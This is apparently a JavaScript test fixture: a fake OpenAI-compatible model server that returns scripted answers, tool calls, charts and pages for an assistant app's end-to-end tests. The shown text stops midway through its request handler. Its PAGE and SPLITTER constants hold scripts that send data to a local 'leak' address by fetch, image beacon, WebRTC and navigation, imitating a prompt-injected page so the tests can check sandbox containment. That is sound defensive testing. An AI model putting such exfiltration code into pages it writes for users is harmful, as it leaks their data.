// A deterministic OpenAI-compatible brain for local end-to-end checks.
// Usage: node test/fixtures/fake-brain.js   (then connect "Other" → http://127.0.0.1:4174/v1)
// Streams a short thought and a Markdown answer, in the language the prompt asks for.
// Answers from shared documents when there are some, citing them as [n], and imitates a
// provider's prefix cache: usage reports how much of each request repeats the previous one.
// With a shared table of data it works like a real brain would in 0.3: it offers
// Calculations if they're off, then runs a script that reads the file and totals it.
// From 0.4 it remembers what follows "Remember", says what its <memory> holds when asked
// "What do you know?", and saves a skill when asked to (finding the tool first if needed).
// From 0.5 it searches the web when asked to, reads the user's latest emails through a
// connection (finding its tool first, or from a script when Calculations are on) and sums them
// up citing each one.
// From 0.6 it splits a "briefing" between two helpers (each finds the mail tool, asks first, and
// reports one email), answers Double-check's requests by comparing words, and gives a brief of
// what's new when told the user is back. It sees pictures (a capture of the screen): it says how
// big the last one is, read from its PNG header. It titles conversations with their first longer words.
// It writes a "Word document" when asked for one, adds a step to it when asked to, and makes a
// spreadsheet of a shared table's totals from a script (D119). Asked for a "web page", it writes one
// whose script would send what it holds away, as an injected page would (D126), and an "SVG logo" as a drawing.
// From 0.7 it makes a routine when asked for something "every" day or for a routine, at the time
// asked, or else at the time Jean says requests of the kind were made; with Routines off, it offers them first.
// For the browser (D140) it serves a bakery's site, whose page links to its menu, and a page that
// refuses to be framed; asked for "the bakery site", it opens it (offering the browser first if
// it's off) and answers from the page; asked to "give me a link", it answers with one.
// Asked for a letter, it first asks three questions at once (D146): the tone, recommending one,
// what the letter asks for, several at once, and who signs it; then it says what it was told.
// Told "I'm Marie" (or "je m'appelle Marie"), it saves the name while it may (D150).
// Asked what it can do, it reads `about`, on what follows "about" if anything does, and answers with the first line of
// each part it read whole, or else with the lines that say where things stand (D423).
// In a conversation opened on a folder (D141), it finds which files mention something, lists the
// folder, and changes a file when asked to change "this" to "that" in it: it opens the file first,
// then changes it, and asks again when told the folder is open now. Asked to make a page "saying"
// something, it makes it there, as a heading (D156). Asked to "Chart" something, for a jig or for
// slides, it answers with a chart, a tune or a deck, as the skills of Jean's own directory write
// them (D196, D200). Asked to compare phone plans, it lays out a comparison, steps and notes, and asked
// for the steps to buy a phone, it writes them apart, as bold numbered paragraphs, and asked for the
// half year's sales, a table wider than the text, and to compare an iPhone and a Pixel, in French, a
// comparison whose options say much (D215). Asked to hold a meeting, it calls one, each project's
// assistant saying what its <memory> holds, then agreeing; it answers with what was said (D224).
// Asked to draw something, it offers pictures if they are off, then makes one, which
// /images/generations answers, streamed when asked, a glimpse a second twice, then the picture (D265);
// asked for a film, it makes one of 4 seconds, which /videos makes at once (D251). Asked whether a
// certificate is genuine, it checks the files shared with check_certificate and says what it found (D274),
// looking for a picture's watermark too when the question names one (D324).
// Asked what the files say about something, it searches the project's files and quotes what it found (D24).
// Given "a very long task", it says it read most of a big window; asked to sum the conversation up, it does, and
// read on from a summary, it says so (D359). Asked to do something "step by step" with plans on, it plans it, waits for the
// user's word, then does each step and ticks it off, adding what the user's words asked for; asked to count to twenty, it
// takes a step a number, past its limit (D364). Counting slowly to five, a second a step, it stops when told to (D365).
// In a child's profile, told of being bullied, or hit at home, it raises a concern, saying so when it is at home (D228).
// Asked to think it over, it thinks on until it is stopped; told to answer now, it answers at once, saying how much it was
// asked to think (D414).
import { createServer } from 'node:http'
import { deflateSync, crc32 } from 'node:zlib'

/** The savings plan, worked out month by month and drawn as a page of bars (D163). */
const SAVINGS = `const rate = 0.04 / 12
let balance = 0
const years = []
for (let month = 1; month <= 120; month++) {
  balance = balance * (1 + rate) + 200
  if (month % 12 === 0) years.push(Math.round(balance))
}
const total = years[years.length - 1]
const bars = years.map((value, i) => '<rect x="' + (40 + i * 50) + '" y="' + (220 - (value / total) * 200) + '" width="36" height="' + ((value / total) * 200) + '" fill="#c8691c"></rect>').join('')
await fs.writeFile('Savings plan.html', '<!doctype html><title>Savings plan</title><h1>Savings plan</h1><svg viewBox="0 0 560 240" width="560">' + bars + '</svg><p id="total">After 10 years: ' + total + '</p>')
return { years, total }`

const PORT = Number(process.env.PORT) || 4174
// Milliseconds between streamed pieces: slow enough to watch by hand, less in the smoke tests.
const PACE = Number(process.env.PACE ?? 35)
let previous = ''
const BAKERY = `http://127.0.0.1:${PORT}/site/bakery.html`
// An article of Wikipedia's, which browse reads through its API (D35): the test routes its site.
const ARTICLE = 'https://en.wikipedia.test/wiki/Lighthouse'
/** @type {Record<string, { body: string, headers?: Record<string, string> }>} */
const SITE = {
  '/site/bakery.html': { body: '<!doctype html><title>The bakery</title><h1>The bakery</h1><p>Fresh bread every morning, from 7 am.</p><p><a href="menu.html">Menu</a></p>' },
  '/site/menu.html': { body: '<!doctype html><title>Menu</title><h1>Menu</h1><p>Croissants and baguettes.</p>' },
  '/site/refuses.html': { body: '<!doctype html><title>Refuses</title><h1>Never in a frame</h1>', headers: { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'" } },
}

/** @param {string} a @param {string} b */
function sharedPrefix(a, b) {
  let i = 0
  while (i < a.length && i < b.length && a[i] === b[i]) i++
  return i
}

const REPLIES = {
  en: (/** @type {string} */ question) => `## Here is what I found\n\nYou asked: *${question}*\n\n- First, I read your request.\n- Then, I worked it out **carefully**.\n\n| Step | Status |\n|---|---|\n| Read | done |\n| Answer | done |\n\nAnything else?`,
  fr: (/** @type {string} */ question) => `## Voici ce que j’ai trouvé\n\nVous avez demandé : *${question}*\n\n- D’abord, j’ai lu votre demande.\n- Ensuite, j’ai réfléchi **avec soin**.\n\nAutre chose ?`,
  ar: (/** @type {string} */ question) => `## إليك ما وجدته\n\nسألتَ: *${question}*\n\n- أولًا، قرأتُ طلبك.\n- ثم فكّرتُ **بعناية**.\n\nهل من شيء آخر؟`,
  ja: (/** @type {string} */ question) => `## わかったこと\n\nご質問：*${question}*\n\n- まず、ご依頼を読みました。\n- 次に、**丁寧に**考えました。\n\n他にありますか？`,
}
const TOTALS = {
  en: (/** @type {string} */ of, /** @type {string} */ by) => `Here are the exact totals of **${of}** by **${by}**`,
  fr: (/** @type {string} */ of, /** @type {string} */ by) => `Voici les totaux exacts de **${of}** par **${by}**`,
  ar: (/** @type {string} */ of, /** @type {string} */ by) => `إليك المجاميع الدقيقة لـ **${of}** حسب **${by}**`,
  ja: (/** @type {string} */ of, /** @type {string} */ by) => `**${by}**ごとの**${of}**の正確な合計です`,
}
const SUGGESTIONS = {
  en: ['Show it as a chart', 'Which one grew most?', 'Write a short summary'],
  fr: ['Montre-le en graphique', 'Lequel a le plus progressé ?', 'Écris un court résumé'],
  ar: ['اعرضه كرسم بياني', 'أيّها نما أكثر؟', 'اكتب ملخصًا قصيرًا'],
  ja: ['グラフで見せて', '一番伸びたのはどれ？', '短い要約を書いて'],
}

/** What a letter needs (D146). */
const LETTER = [
  { question: 'Which tone should the letter have?', options: [{ label: 'Formal', description: 'For a bank or an office', recommended: true }, { label: 'Friendly' }] },
  { question: 'What should it ask for?', options: [{ label: 'A meeting' }, { label: 'A refund' }, { label: 'More time' }], multiple: true },
  { question: 'Who signs it?' },
]

/** A move, planned step by step, in the user's language (D364). */
const MOVE = {
  en: ['Pack the boxes', 'Book the van', 'Clean the flat'],
  fr: ['Faire les cartons', 'Réserver la camionnette', 'Nettoyer l’appartement'],
  ar: ['توضيب الصناديق', 'حجز الشاحنة', 'تنظيف الشقة'],
  ja: ['箱に詰める', 'トラックを予約する', '部屋を掃除する'],
}
const PLANNED = { en: 'Every step of the plan is done.', fr: 'Toutes les étapes du plan sont faites.', ar: 'أُنجزت كل خطوات الخطة.', ja: '計画のすべてのステップが完了しました。' }

/**
 * The plan's next update, or the answer once every step is done: no step done until the user confirms it, then one more
 * at each update; the words the user changed it with add a step. @param {any[]} messages @param {'en' | 'fr' | 'ar' | 'ja'} lang
 */
function planned(messages, lang) {
  const ids = new Set(messages.flatMap((m) => (m.tool_calls ?? []).filter((c) => c.function.name === 'plan').map((c) => c.id)))
  const results = messages.filter((m) => m.role === 'tool' && ids.has(m.tool_call_id)).map((m) => String(m.content))
  if (/didn't confirm|don't use plans/.test(results.at(-1) ?? '')) return { answer: 'All right: tell me what you would like instead.' }
  const added = results.map((content) => /wants the plan changed: «(.+?)»/.exec(content)?.[1]).find(Boolean)
  const steps = [...MOVE[lang], ...(added ? [added.replace(/^add a step to /i, '').replace(/^./, (c) => c.toUpperCase())] : [])]
  const go = results.findIndex((content) => /confirmed the plan|plan is shown/.test(content))
  const done = go < 0 ? 0 : results.length - go
  if (done > steps.length) return { answer: PLANNED[lang] }
  return { call: { name: 'plan', args: { entries: steps.map((content, i) => ({ content, status: i < done ? 'completed' : i === done ? 'in_progress' : 'pending' })) } } }
}

/** What the user answered, question by question. @param {string} content the tool's result */
function told(content) {
  if (/did not answer/.test(content)) return 'Nobody answered, so I wrote a formal letter.'
  const { answers } = JSON.parse(content)
  return `Here is your letter, as you asked:\n\n${answers.map((/** @type {any} */ a) => `- ${a.question} ${a.skipped ? 'You skipped it.' : [a.chose ?? []].flat().concat(a.wrote ?? []).join(', ')}`).join('\n')}`
}

/** A script that totals the first number column by the first text column. @param {string} name */
const totalsScript = (name) => `const rows = csv(await file(${JSON.stringify(name)}))
const keys = Object.keys(rows[0])
const by = keys.find((key) => typeof rows[0][key] === 'string')
const of = keys.find((key) => typeof rows[0][key] === 'number')
const totals = {}
for (const row of rows) totals[row[by]] = (totals[row[by]] ?? 0) + row[of]
console.log(rows.length + ' rows')
return { by, of, totals }`

/** The same totals, also written as a spreadsheet from the script (codemode, D119). @param {string} name */
const spreadsheetScript = (name) => totalsScript(name).replace('return { by, of, totals }',
  "await tools.write({ name: 'Totals.xlsx', content: [[by, of], ...Object.entries(totals)].map((row) => row.join(',')).join('\\n') })\nreturn { by, of, totals }")
/** Formulas in LaTeX, in a line, set apart and in a table, beside prices (D185). */
const GOLDEN = 'The ratio tends to $\\varphi \\approx 1.618$:\n\n$$\\varphi = \\frac{1 + \\sqrt{5}}{2}$$\n\n| Terms | Ratio |\n|---|---|\n| $F_5 / F_4$ | 1.6667 |\n\nA book costs $5 and a pen $10.'
/** A LaTeX document in a code block: sections, formulas set apart and in a line (D185). */
/** @type {Record<string, string>} */
const PLANS = {
  en: `Here are the three plans, over 24 months:

| | Free | Orange ★ | SFR |
|---|---|---|---|
| **Total over 24 months** | €480 | **€360** | €600 |
| **Data** | 100 GB | 80 GB | **200 GB** |
| **Commitment** | **None** | 12 months | 24 months |
| **5G** | ✓ | ✓ | ✗ |

**Orange** fits you best: the cheapest over two years, with enough data.

1. **Get your number's code**: call 3179 from your phone.
2. **Order the SIM** — online, in a few minutes.
3. **Turn it on** when it arrives; your number moves within a day.

> [!WARNING]
> Leaving SFR before 24 months costs the months left.

> 💡 **Tip:** ask Orange to match Free's price.

| Month | Orange | SFR |
|---|---|---|
| January | €15 | €25 |
| February | €15 | €25 |`,
  ar: `إليك الباقات الثلاث على مدى 24 شهرًا:

| | فري | أورنج ★ | إس إف آر |
|---|---|---|---|
| الإجمالي على 24 شهرًا | 480 € | **360 €** | 600 € |
| البيانات | 100 غيغابايت | 80 غيغابايت | **200 غيغابايت** |
| الالتزام | **بدون** | 12 شهرًا | 24 شهرًا |
| 5G | ✓ | ✓ | ✗ |

**أورنج** هي الأنسب لك: الأرخص على مدى عامين، مع بيانات كافية.

1. **احصل على رمز رقمك**: اتصل بالرقم 3179 من هاتفك.
2. **اطلب الشريحة** — عبر الإنترنت، في دقائق.
3. **فعّلها** عند وصولها؛ ينتقل رقمك خلال يوم.

> [!WARNING]
> مغادرة إس إف آر قبل 24 شهرًا تكلّف الأشهر المتبقية.

> 💡 **نصيحة:** اطلب من أورنج مطابقة سعر فري.`,
  ja: `24か月で比べた3つのプランです：

| | Free | Orange ★ | SFR |
|---|---|---|---|
| 24か月の合計 | 480ユーロ | **360ユーロ** | 600ユーロ |
| データ | 100 GB | 80 GB | **200 GB** |
| 契約期間 | **なし** | 12か月 | 24か月 |
| 5G | ✓ | ✓ | ✗ |

あなたには**Orange**が最適です。*2年間で最も安く*、データも十分です。

1. **番号の移行コードを取得**：お使いの電話から3179に電話します。
2. **SIMを注文** — オンラインで数分です。
3. **届いたら有効化**：番号は1日以内に移ります。

> [!WARNING]
> 24か月より前にSFRを解約すると、残りの月の料金がかかります。

> 💡 **ヒント：** Orangeに Free の料金に合わせてもらえるか聞いてみましょう。`,
}
const HALF = `The half year's sales, by region:

| Region | January | February | March | April | May | June | Total | Change | Share |
|---|---|---|---|---|---|---|---|---|---|
| North-East | €12,400 | €13,150 | €14,020 | €15,380 | €16,240 | €17,900 | €89,090 | +44.4% | 31.0% |
| South-West | €9,870 | €10,210 | €11,460 | €12,050 | €12,980 | €13,400 | €69,970 | +35.8% | 24.3% |
| East | €7,120 | €7,480 | €8,030 | €8,610 | €9,150 | €9,820 | €50,210 | +37.9% | 17.5% |
| West | €10,540 | €10,990 | €11,720 | €12,460 | €13,310 | €14,080 | €75,100 | +33.6% | 26.1% |

The North-East grew fastest.`
const PHONES = `Voici les deux téléphones :

| | iPhone 17 Pro | Google Pixel 10 Pro (Android) |
|---|---|---|
| Prix neuf | 1 299 € au lancement, environ 1 130 € aujourd'hui | **749 €** (prix habituel 999 €) |
| Mises à jour | 5 ans de suivi logiciel selon Back Market. Un revendeur annonce 7 ans, mais je n'ai pas trouvé de confirmation officielle d'Apple | **7 ans** de mises à jour de sécurité et du système |
| Photo et vidéo | Triple capteur 48 Mpx, très prisé des créateurs de contenu | Photos et vidéos de très haute qualité, avec beaucoup d'IA |
| Autonomie | Record de 33 heures | Plus de 24 h |
| Simplicité | Très cohérent, peu de réglages à faire | Simple aussi, mais avec plus d'options à régler |

Le Pixel coûte bien moins cher.`
/** Components (D291): a flowchart and a mind map in Mermaid, a trip in GeoJSON, and a page whose form and map are in step both ways. */
const FLOW = 'Here is how to decide:\n\n```mermaid\nflowchart TD\n  A([Leaving home]) --> B{Is it raining?}\n  B -->|Yes| C[Take an umbrella]\n  B -- No --> D[Wear sunglasses]\n  C --> E([Go out])\n  D --> E\n```\n\nTake the umbrella when it rains.'
const MIND = 'The world of coffee:\n\n```mermaid\nmindmap\n  root((Coffee))\n    Origins\n      Ethiopia\n      Yemen\n    Brewing\n      Espresso\n      Filter\n    Health\n```'
const TRIP = 'Your trip:\n\n```geojson\n{"type":"FeatureCollection","features":[{"type":"Feature","properties":{"name":"Marseille"},"geometry":{"type":"Point","coordinates":[5.37,43.3]}},{"type":"Feature","properties":{"name":"Aix"},"geometry":{"type":"Point","coordinates":[5.45,43.53]}},{"type":"Feature","properties":{"name":"Route"},"geometry":{"type":"LineString","coordinates":[[5.37,43.3],[5.45,43.53]]}}]}\n```\n\nTwo stops, half an hour apart.'
const PLANNER = `Pick a stop, here or on the map:

\`\`\`html
<main>
  <label>Stop <select id="stop"><option>Marseille</option><option>Aix</option></select></label>
  <p id="chosen">Marseille</p>
</main>
<aside><app-map id="map"></app-map></aside>
<script>
  const stops = { Marseille: [5.37, 43.3], Aix: [5.45, 43.53] }
  const map = document.getElementById('map'), stop = document.getElementById('stop'), chosen = document.getElementById('chosen')
  const show = (name) => {
    chosen.textContent = name
    stop.value = name
    map.textContent = JSON.stringify({ type: 'FeatureCollection', features: Object.entries(stops).map(([each, at]) => ({ type: 'Feature', properties: { stop: each, name: each === name ? each + ' ★' : each }, geometry: { type: 'Point', coordinates: at } })) })
  }
  stop.addEventListener('change', () => show(stop.value))
  map.addEventListener('pick', (event) => show(event.detail.stop))
  show('Marseille')
</script>
\`\`\``

/** A day planned (D291): key figures, a timeline of bold times, and a checklist, one thing already ticked. */
const SATURDAY = `Your Saturday at the market:

- **3** stalls
- **€45** budget
- **12** km on foot

Your morning:

- **08:30** Leave home, with the bags
- **09:00–10:30** The market: bread, cheese, fruit
- **11:00** Coffee at the corner

Bring:

- [ ] Shopping bags
- [x] Cash
- [ ] The list`
const BUY = `## Steps to buy

**1. Choose new or used.**
- The 18 Pro is $1,199 new.
- A used or refurbished 15 Pro 128GB costs roughly $500–680 in the listings I found.

**2. Choose the storage.**
- The 18 Pro starts at 256GB. 512GB is $1,399, 1TB is $1,799 and 2TB is $2,399.

**3. Decide how to pay.**
- You can pay in full, or use Apple Upgrade, which starts at $34.99 a month over 24 months.
- Compare the total over 24 months, not just the monthly amount.

**4. Trade in your current phone** at Apple, your carrier or a reseller, and compare the offers before you commit.

**5. Pick where to buy.**
- For the 18 Pro, use Apple or your carrier.
- Avoid private sellers unless you can check the phone in person.

**6. If you buy used, check these:**
- It is unlocked and works with your carrier.
- Battery health is 85% or higher, or the battery is new.

**7. Order and set up.**
- Back up your old phone to iCloud or a computer first.
- Don't ship your trade-in until the new phone works.

If you tell me your budget and how long you'll keep the phone, I can recommend one and find a seller.`
const EULER = "Voici :\n\n```latex\n\\section*{Formules d'Euler}\n\\subsection*{Identité d'Euler}\n\\[ e^{i\\pi} + 1 = 0 \\]\nPour un cube : $8 - 12 + 6 = 2$.\n```"
/** A LaTeX block of one line: a formula alone. */
const IDENTITY = 'Here it is:\n\n```latex\ne^{i\\pi} + 1 = 0\n```'
/** A proof as brains write it: one aligned formula, its words in \textbf and \text, its rows broken with \\[1.2em] (D185). */
const PROOF = `Voici la preuve :\n\n\`\`\`latex\n${String.raw`\begin{aligned}
&\textbf{Théorème : } \forall x\in\mathbb{R},\quad e^{ix}=\cos x+i\sin x\\[1.2em]
&\textbf{Preuve : séries entières}\\
&\text{Étape 1 : } z=ix \;\Rightarrow\; e^{ix}=\sum_{n=0}^{\infty}\frac{(ix)^n}{n!}\\
&\text{Étape 2 : } i^{2k}=(-1)^k,\qquad i^{2k+1}=i\,(-1)^k\\
&\text{donc } e^{ix}=\cos x+i\sin x\qquad\blacksquare
\end{aligned}`}\n\`\`\``
/** A budget as a pgf-pie chart, as a brain wrote it: in a centred TikZ picture, each slice's number before a \% (D185). */
const BUDGET = `Voici la répartition :\n\n\`\`\`latex\n${String.raw`\begin{center}
\begin{tikzpicture}
\pie[rotate=0, radius=3cm, sum=100, color={blue!50, green!50, orange!50}, explode=0.1]
{50\% Loyer, 30.5\% Santé, 19.5\% Autres}
\end{tikzpicture}
\end{center}`}\n\`\`\``
/** Its follow-ups, with formulas in a line. */
const EULER_NEXT = ['Démontre la formule $e^{ix}=\\cos x+i\\sin x$', "Explique l'indicatrice d'Euler $\\varphi(n)$"]
/** A chart and a tune, as the skills of Jean's own directory write them: an ECharts option and ABC notation (D196). */
const CHART = 'Here are the sales:\n\n```echarts\n{"title":{"text":"Croissants sold"},"tooltip":{"trigger":"axis"},"xAxis":{"type":"category","data":["Mon","Tue","Wed"]},"yAxis":{"type":"value"},"series":[{"name":"Croissants","type":"bar","data":[120,1250.5,90]}]}\n```\n\nTuesday sold the most.'
const JIG = 'Here is a jig:\n\n```abc\nX:1\nT:The Legacy Jig\nM:6/8\nL:1/8\nQ:3/8=116\nR:jig\nK:G\nGFG BAB | gfg d2B | GFG BAB | d2B G2B |\nGFG BAB | gfg d2B | c2c B2A | GFG B2G :|\n```\n\nPlay it lightly.'
/** A deck, as the Slides skill writes it in Marp's Markdown (D200): numbered, a title slide, a table, its colours swapped on the last, a note for the speaker. */
const DECK = 'Here are your slides:\n\n```marp\n---\npaginate: true\nfooter: Bakery · 2027\n---\n\n<!-- _class: lead -->\n# A second oven\n\n---\n\n## What it costs\n\n<!-- Say it pays back in 14 months. -->\n\n| | Cost |\n|---|---:|\n| Oven | €18,000 |\n\n---\n\n<!-- _class: invert -->\n## Paid back in 14 months\n```\n\nThree slides on the new oven.'
/** A page in an answer (D289): the room's colours, under their own names and under one a brain guessed with a light colour to fall back on, a share worked out as it is typed, a form whose submit sends it on (Chromium fires it only where the frame allows forms), and a fetch that must not get out. */
const SPLITTER = `Here is a bill splitter:

\`\`\`html
<style>.fields { display: flex; flex-wrap: wrap; gap: 0.75rem; color: var(--color-text, #222); } p { color: var(--color-text-secondary); }</style>
<form id="split">
<div class="fields"><label>Bill <input id="bill" type="number" value="120"></label> <label>People <input id="people" type="number" value="4"></label></div>
<p>Each pays <output id="each"></output></p>
<button>Ask how to round it</button>
</form>
<script>
  const [bill, people, each] = ['bill', 'people', 'each'].map((id) => document.getElementById(id))
  const update = () => { each.textContent = people.valueAsNumber >= 1 ? new Intl.NumberFormat(document.documentElement.lang).format(bill.valueAsNumber / people.valueAsNumber) : '—' }
  for (const input of [bill, people]) input.addEventListener('input', update)
  document.getElementById('split').addEventListener('submit', (event) => { event.preventDefault(); sendPrompt('Each of us pays ' + each.textContent + '. How should we round it?') })
  update()
  fetch('http://127.0.0.1:4182/leak?page').catch(() => {})
</script>
\`\`\`

Type the bill and how many you are.`
/** A page that charts with ECharts, which Jean lends it (D289): a region to pick, its sales drawn. */
/** Written as brains write a page for a whole screen: its root and body as tall as the frame, the chart the rest. */
const EXPLORER = `Pick a region:

\`\`\`html
<style>html, body { block-size: 100% } body { display: flex; flex-direction: column } #chart { flex: 1 }</style>
<label>Region <select id="region"><option>North</option><option>South</option></select></label>
<div id="chart"></div>
<script type="module">
  import * as echarts from 'echarts'
  const sales = { North: [1200, 1340], South: [950, 1010] }
  const region = document.getElementById('region')
  const chart = echarts.init(document.getElementById('chart'))
  const draw = () => chart.setOption({ xAxis: { type: 'category', data: ['Jan', 'Feb'] }, yAxis: { type: 'value' }, series: [{ type: 'bar', data: sales[region.value] }] })
  region.addEventListener('change', draw)
  draw()
</script>
\`\`\``
const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
/** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. It can fill the screen and save its prices, by a link or from its code (D158). */
const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p><p id="call"></p>
<a id="away" href="http://127.0.0.1:4182/leak?link">Away</a> <button id="go">Go</button>
<button id="big">Big</button> <a id="keep" download="Prices.csv" href="data:text/csv,Croissant%2C2">Keep</a> <button id="export">Export</button>
<script>document.getElementById('out').textContent = 'Baked by a script ' + document.compatMode
const leak = 'http://127.0.0.1:4182/leak?'
fetch(leak + 'fetch').catch(() => {})
new Image().src = leak + 'image'
try {
  const call = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:4182' }] })
  call.createDataChannel('leak')
  call.createOffer().then((offer) => call.setLocalDescription(offer))
  document.getElementById('call').textContent = 'Calling'
} catch (error) { document.getElementById('call').textContent = error.name }
document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }
const out = (text) => { document.getElementById('out').textContent = text }
document.getElementById('big').onclick = () => document.body.requestFullscreen().then(() => document.exitFullscreen()).then(() => out('Full screen'), (error) => out(error.name))
document.getElementById('export').onclick = () => {
  const link = Object.assign(document.createElement('a'), { href: URL.createObjectURL(new Blob(['{"croissant":2}'])), download: 'Prices.json' })
  link.click()
  URL.revokeObjectURL(link.href)
}</script>`

/** A small PNG: a warm gradient. */
function picture(width = 96, height = 64) {
  const rows = Buffer.concat(Array.from({ length: height }, (_, y) => Buffer.from([0, ...Array.from({ length: width }, (_, x) => [200 - y, 110 + x, 70]).flat()])))
  const chunk = (/** @type {string} */ type, /** @type {Buffer} */ data) => {
    const body = Buffer.concat([Buffer.from(type), data])
    return Buffer.concat([Buffer.from(new Uint32Array([data.length]).buffer).reverse(), body, Buffer.from(new Uint32Array([crc32(body)]).buffer).reverse()])
  }
  const header = Buffer.from([0, 0, 0, width, 0, 0, 0, height, 8, 2, 0, 0, 0])
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', header), chunk('IDAT', deflateSync(rows)), chunk('IEND', Buffer.alloc(0))]).toString('base64')
}

/**
 * Double-check's verdicts: a claim is supported when most of its longer words are in its sources.
 * @param {string} text "Claim 1: …\nSource [n]: …" blocks
 */
function checked(text) {
  const words = (/** @type {string} */ part) => part.toLowerCase().match(/[\p{L}\p{N}]{4,}/gu) ?? []
  return text.split(/\n\n(?=Claim \d+:)/).map((block, i) => {
    const [claim, ...sources] = block.split('\n')
    const said = new Set(words(sources.join(' ')))
    const own = words(claim.replace(/^Claim \d+:/, ''))
    return `${i + 1}: ${own.filter((word) => said.has(word)).length >= own.length * 0.6 ? 'supported' : 'missing'}`
  }).join('\n')
}

/** Sources a tool's result lists: `Source [n]: title (address)` and what follows. @param {string} text */
const sourcesIn = (text) => [...text.matchAll(/Source \[(\d+)\]: (.+?) \(([^)]+)\)\n?(?:Picture: (\S+)\n)?([^\n]*)/g)].map((m) => ({ n: m[1], title: m[2], url: m[3], picture: m[4], more: m[5] }))

createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Headers', '*')
  if (req.method === 'OPTIONS') return res.end()
  if (req.url?.endsWith('/models')) {
    res.setHeader('Content-Type', 'application/json')
    return res.end(JSON.stringify({ data: [{ id: 'fake-brain-1' }, { id: 'fake-brain-2' }, { id: 'fake-image-1' }, { id: 'fake-video-1' }] }))
  }
  if (req.url?.endsWith('/images/generations')) {
    let body = ''
    for await (const chunk of req) body += chunk
    if (!JSON.parse(body).stream) return res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ data: [{ b64_json: picture() }] }))
    res.writeHead(200, { 'Content-Type': 'text/event-stream' })
    const send = (/** @type {any} */ event) => res.write(`event: ${event.type}\ndata: ${JSON.stringify({ ...event, output_format: 'png' })}\n\n`)
    for (const i of [0, 1]) {
      await new Promise((resolve) => setTimeout(resolve, 1000))
      send({ type: 'image_generation.partial_image', partial_image_index: i, b64_json: picture(24 * (i + 1), 16 * (i + 1)) })
    }
    await new Promise((resolve) => setTimeout(resolve, 1000))
    send({ type: 'image_generation.completed', b64_json: picture() })
    return res.end()
  }
  // A film's job, done as soon as it is asked for, and the film: the start of an MP4.
  if (req.url?.endsWith('/videos')) {
    for await (const chunk of req) void chunk
    res.setHeader('Content-Type', 'application/json')
    return res.end(JSON.stringify({ id: 'film-1', status: 'completed' }))
  }
  if (req.url?.endsWith('/videos/film-1/content')) return res.writeHead(200, { 'Content-Type': 'video/mp4' }).end(Buffer.from([0, 0, 0, 24, 102, 116, 121, 112, 105, 115, 111, 109]))
  const page = SITE[req.url?.split('?')[0] ?? '']
  if (page) return res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...page.headers }).end(page.body)
  if (!req.url?.endsWith('/chat/completions')) return res.writeHead(404).end()

  let body = ''
  for await (const chunk of req) body += chunk
  const { messages, tools = [], reasoning_effort: effort } = JSON.parse(body)
  // Thinking it over, it thinks on, slowly enough to be told to answer now, until it is stopped (D414).
  const said = messages.filter((/** @type {any} */ message) => message.role === 'user').map((/** @type {any} */ message) => String(message.content))
  const hurried = /^Answer now, from what you have thought/.test(said.at(-1) ?? '')
  if (/^think it over/i.test(said.at(hurried ? -2 : -1) ?? '')) {
    res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
    const send = (/** @type {object} */ delta, finish = null) => res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`)
    if (hurried) send({ content: `Here is my answer, thinking ${effort ?? 'as I would'}.` }, 'stop')
    else {
      for (let i = 0; i < 1500 && !res.destroyed; i++) {
        send({ reasoning: 'Weighing it once more, and again. ' })
        await new Promise((resolve) => setTimeout(resolve, Math.max(PACE, 20)))
      }
      send({ content: 'I thought it all through.' }, 'stop')
    }
    return res.end('data: [DONE]\n\n')
  }
  // A conversation's title, asked beside the answer: its first three longer words.
  if (messages[0]?.role === 'system' && messages[0].content.startsWith('Write a title')) {
    const title = (messages.at(-1).content.match(/[\p{L}\p{N}]{5,}/gu) ?? []).slice(0, 3).join(' ')
    res.writeHead(200, { 'Content-Type': 'text/event-stream' })
    res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: `"${title}."` }, finish_reason: 'stop' }] })}\n\n`)
    return res.end('data: [DONE]\n\n')
  }
  const serialized = JSON.stringify(messages)
  const cached = sharedPrefix(previous, serialized)
  previous = serialized
  // A message with pictures is a list of parts: the text is read as one, the pictures apart.
  /** @type {string[]} */
  const pictures = []
  for (const message of messages) {
    if (!Array.isArray(message.content)) continue
    pictures.push(...message.content.flatMap((/** @type {any} */ part) => (part.type === 'image_url' ? [part.image_url.url] : [])))
    message.content = message.content.flatMap((/** @type {any} */ part) => (part.type === 'text' ? [part.text] : [])).join('\n\n')
  }
  const png = Buffer.from(pictures.at(-1)?.replace(/^data:image\/png;base64,/, '') ?? '', 'base64')
  const declared = new Set(tools.map((/** @type {any} */ tool) => tool.function.name))
  const lastUser = [...messages].reverse().find((message) => message.role === 'user')?.content ?? ''
  const last = messages.at(-1)
  const documents = [...messages.map((m) => m.content).join('\n').matchAll(/<document(?: source="(\d+)")? name="([^"]*)">\n([\s\S]*?)\n<\/document>/g)]
  const table = documents.findLast((doc) => /\.(csv|tsv)$/i.test(doc[2]))
  const question = lastUser.replace(/<document[\s\S]*<\/document>\n\n/, '').replace(/<system-note>[\s\S]*?<\/system-note>\n\n/g, '')
  const system = messages.find((message) => message.role === 'system')?.content ?? ''
  const lang = /[؀-ۿ]/.test(question) ? 'ar' : /[぀-ヿ一-龯]/.test(question) ? 'ja' : /use French\./.test(system) || /now French/.test(serialized) || /[éèàçù]/.test(question) ? 'fr' : 'en'
  const cite = (/** @type {RegExpMatchArray | undefined} */ doc) => (doc?.[1] ? ` [${doc[1]}]` : '')

  /** @type {{ name: string, args: object } | null} */
  let call = null
  let answer = ''
  // What the brain was told it knows: the frozen <memory>, or the latest note about it.
